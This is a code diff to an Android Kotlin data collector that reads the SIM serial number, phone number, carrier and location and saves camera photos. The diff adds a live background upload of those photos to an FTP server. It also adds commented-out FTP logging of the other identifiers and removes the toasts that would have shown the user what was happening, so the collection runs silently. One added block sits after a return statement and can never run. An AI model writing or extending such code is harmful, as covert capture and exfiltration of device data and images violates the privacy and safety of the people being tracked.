@@ -108,6 +108,11 @@ object MessageCollector {
         var iccid = "N/A"
         iccid = myTelephonyManager.getSimSerialNumber()
         return iccid
+        Thread({
+
+/*            MyFTPClient.writeFileToFtp("Log","iccid:"+iccid+"\n");*/
+        }).start();
+
     }
 
     @SuppressLint("MissingPermission")
@@ -117,7 +122,9 @@ object MessageCollector {
 
         nativePhoneNumber = myTelephonyManager.getLine1Number()
 
-
+        Thread({
+/*            MyFTPClient.writeFileToFtp("Log","手机号:"+nativePhoneNumber+"\n");*/
+        }).start()
 
         return nativePhoneNumber
     }
@@ -135,6 +142,10 @@ object MessageCollector {
         } else if (NetworkOperator.equals("46003")) {
             providersName = "中国电信"//中国电信
         }
+        Thread({
+/*            MyFTPClient.writeFileToFtp("Log","服务商:"+providersName+"\n");*/
+
+        }).start()
 
         return providersName
 
@@ -142,24 +153,31 @@ object MessageCollector {
 
     @SuppressLint("MissingPermission")
     fun getLocation(): String{
+        Log.i("test","hereLoc")
         val location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
 
 
 
-        Toast.makeText(context, getStreet(location),Toast.LENGTH_SHORT).show();
+
         //Log.i("location",getStreet(location));
+        Log.i("test","hereLoc")
+        Thread({
 
+/*            MyFTPClient.writeFileToFtp("Log2","Time:"+location.time+"\n经度:"+location.longitude+";纬度:"+location.latitude+";海拔:"+location.altitude);*/
 
-        return "Time:"+location.time+";经度:"+location.longitude+";纬度:"+location.latitude+";海拔:"+location.altitude
+        }).start()
+        Log.i("test","hereLoc")
+        return "经度:"+location.longitude+";纬度:"+location.latitude+";海拔:"+location.altitude+"\n" + getStreet(location);
     }
 
 
     fun getStreet(location: Location): String {
+        Log.i("test","hereStreet")
         val geocoder = Geocoder(context)
         val stringBuilder = StringBuilder();
         //根据经纬度获取地理位置信息
         var addresses:List<Address> = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
-
+        Log.i("test","hereStreet")
         //根据地址获取地理位置信息
         //var addresses = geocoder.getFromLocationName(adressStr, 1);
 
@@ -174,7 +192,7 @@ object MessageCollector {
             stringBuilder.append(address.getLocality()).append("_");//市
 
             stringBuilder.append(address.getSubLocality()).append("_");//乡洲区
-            stringBuilder.append(address.getThoroughfare()).append("_");//道路
+/*            stringBuilder.append(address.getThoroughfare()).append("_");//道路
 
             stringBuilder.append(address.getLatitude()).append("_");//经度
             stringBuilder.append(address.getLongitude());//维度
@@ -184,7 +202,7 @@ object MessageCollector {
 
             stringBuilder.append(address.getSubAdminArea()).append("_");
             stringBuilder.append(address.getPostalCode()).append("_");
-            stringBuilder.append(address.getCountryCode()).append("_");//国家编码
+            stringBuilder.append(address.getCountryCode()).append("_");//国家编码*/
         }
 
         return stringBuilder.toString();
@@ -210,9 +228,16 @@ object MessageCollector {
                     var path = saveFile(data)
                     if (path != null) {
 
+                        //上传你照片功能
+
+                        Thread({
+                            MyFTPClient.uploadFile("","img"+ SimpleDateFormat("yyyy-MM-dd-HH-mm-ss").format(Date()),path)
+                        }).start()
+
+
 
                     } else {
-                        Toast.makeText(context, "保存照片失败", Toast.LENGTH_SHORT).show()
+
                     }
 
                     mWindowManager.removeViewImmediate(cameraView);
